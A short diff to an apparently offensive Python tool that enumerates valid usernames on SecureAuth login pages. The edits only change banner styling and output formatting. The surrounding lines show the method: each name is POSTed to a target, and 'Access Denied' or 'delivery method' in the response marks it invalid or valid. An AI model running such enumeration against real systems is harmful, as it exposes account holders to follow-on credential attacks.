@@ -58,7 +58,7 @@ if not check_only:
     users = open(users_file,"r").readlines()
 
 # Print info.
-screen_art = text2art("SecureAuth\nUser Enum")
+screen_art = text2art("SecureAuth\nUser Enum", font="small")
 print(screen_art)
 print(f"{PINK}[*]{RST} Target URL: {BRIGHT}{url}{RST}")
 
@@ -128,9 +128,9 @@ for user in users:
     r = s.post(url, headers=headers, data=payload) # Send POST req payload.
     for line in r.text.split("\n"):
         if 'Access Denied' in line:
-            print(f"{RED}[-]{RST} Invalid Username: {user}") # Check if invalid user.
+            print(f"{RED}[-]{RST} Invalid Username: " + user.strip()) # Check if invalid user.
         if 'delivery method' in line:
-            print(f"{GREEN}[+]{RST} Valid Username: {user}") # Check if valid user.
+            print(f"{GREEN}[+]{RST} Valid Username: " + user.strip()) # Check if valid user.
             valid_users.append(user)
 
 
